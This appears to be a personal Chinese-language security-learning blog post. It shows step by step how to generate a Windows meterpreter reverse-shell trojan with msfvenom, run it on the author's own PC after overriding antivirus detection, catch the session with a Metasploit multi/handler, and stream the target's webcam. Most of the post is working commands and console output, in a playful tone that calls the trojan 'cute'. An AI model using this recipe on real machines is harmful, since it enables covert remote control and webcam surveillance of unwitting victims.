---
title: 网络安全学习日记2：使用 msfvenom 生成木马远程控制电脑
date: 2026-07-30
updated: 2026-07-30
categories: 网络安全
tags:
  - 网络安全
  - Kali-Linux
  - msfvenom
---

我去好厉害

<!-- more -->

## 生成后门

打开我的 Kali Linux 虚拟机，在终端输入这一行命令：

```sh
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxxxx -f exe -o miao.exe
```

`msfvenom` 是一个很好用的生成后门的工具，在本地可以实时监听。

`-p` 选项：全程 payload，攻击载荷。

`lhost lport` 本机ip地址与监听端口。

`-f` 选项：程序输出格式，最常用的就是 exe，当然也可是 python,java 之类的东西。

`-o` 选项：输出程序的文件名。

这样我们就成功生成了一个后门程序。

![](https://image.smallaw.cc.cd//img1/cp2-1.png)

![](https://image.smallaw.cc.cd//img1/cp2-2.png)

这是个可爱的木马病毒。

## 实际演示

我直接用本机演示了，虚拟机什么东西也没有。

拷出来双击了一下，这种低级毫无伪装的病毒当然被最垃圾的 windows 自带的杀毒软件检测到了，这里我直接就是一个信任。

其实还是要先在本机上开启监听等目标机运行这个木马。

在 Kali 上运行 `msfconsle` 程序，

![](https://image.smallaw.cc.cd//img1/cp2-3.png)

```sh
$ use exploit/multi/handler
```

使用程序攻击模块。

```sh
$ show options //显示选项
```

输出
```sh                                                            
Payload options (generic/shell_reverse_tcp):                                                                                                                                           
                                                                                                                                                                                       
   Name   Current Setting  Required  Description                                                                                                                                       
   ----   ---------------  --------  -----------                                                                                                                                       
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

```
这个 Payload options 就是攻击载荷，上面我们选的攻击载荷是 windows/x64/meterpreter/reverse_tcp，我们就直接设置一下。

```sh
$ set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```

这个 Required 选项就是必须设置的选项，我们根据上面生成后门的配置进行设置。

```sh
$ set lhost xxx.xxx.xxx.xxx
lhost => xxx.xxx.xxx.xxx
$ set lport xxxxx
lport => xxxxx
```

设置好了呢？直接运行！

```sh
$ run
[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:xxxxx 
```

现在就在本机上设置好了监听程序，现在只需要在目标机子上运行 miao.exe 就成功骇入了。

这里我再目标机上运行了木马程序，可以看到 Kali 这边也显示成功获取到了目标机子的权限
```sh
[*] Sending stage (248902 bytes) to 目标机ip
[*] Meterpreter session 1 opened (xxx.xxx.xxx.xxx:xxxxx -> 目标机ip:端口) at 2026-07-30 16:14:43 +0800
```

现在在终端输入 `help` 就能查看能干的所有事情了。

比如我们直接输入 `webcam_stream` 就能打开一个网页实时监控目标机的摄像头（前提是目标机得有）

![](https://image.smallaw.cc.cd//img1/cp2-4.png)

因为我把摄像头挡住了所以是一片黑，不过一开始直接把我整个头照出来时还是挺震撼的。

什么？漏 ip 了？没事，这是局域网ip。